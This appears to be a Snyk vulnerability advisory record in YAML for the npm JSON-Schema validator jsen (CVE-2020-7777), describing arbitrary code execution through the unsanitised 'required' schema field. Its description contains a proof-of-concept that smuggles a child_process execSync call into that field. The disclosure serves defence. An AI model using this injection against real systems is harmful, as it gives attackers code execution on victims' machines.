---
- id: snykio:npm:jsen:1014670
  title: Arbitrary Code Execution
  description: "[jsen][1] is a JSON-Schema validator built for speed\n\nAffected versions
    of this package are vulnerable to Arbitrary Code\nExecution. If an attacker can
    control the schema file, it could run\narbitrary JavaScript code on the victim
    machine. In the module\ndescription and README file there is no mention about
    the risks of\nuntrusted schema files, so I assume that this is applicable.\n\nIn
    particular the `required` field of the schema is not properly\nsanitized. The
    resulting string that is build based on the schema\ndefinition is then passed
    to a `Function.apply();`, leading to an\nArbitrary Code Execution.\n\n### PoC
    \  {#poc}\n\n    const jsen = require('jsen');\n    \n    let schema = JSON.parse(`\n
    \   {\n        \"type\": \"object\",\n        \"properties\": {\n            \"username\":
    {\n                \"type\": \"string\"\n            }\n        },\n        \"required\":
    [\"\\\\\"+process.mainModule.require(\\'child_process\\').execSync(\\'touch malicious\\')+\\\\\"\"]\n
    \   }`);\n    \n    const validate = jsen(schema);\n    validate({});\n\n\n\n[1]:
    https://www.npmjs.com/package/jsen\n"
  affected_package: jsen
  vulnerable_versions:
  - "*"
  severity: high
  package_manager: npm
  cve:
  - CVE-2020-7777
  cwe:
  - CWE-94
  disclosed_date: 2020-10-01
  created_date: 2020-11-23
  last_modified_date: 2020-11-23
  credit:
  - Alessio Della Libera (d3lla)
  references:
  - https://github.com/bugventure/jsen/blob/master/lib/jsen.js#L875
  source_url: https://snyk.io/vuln/SNYK-JS-JSEN-1014670
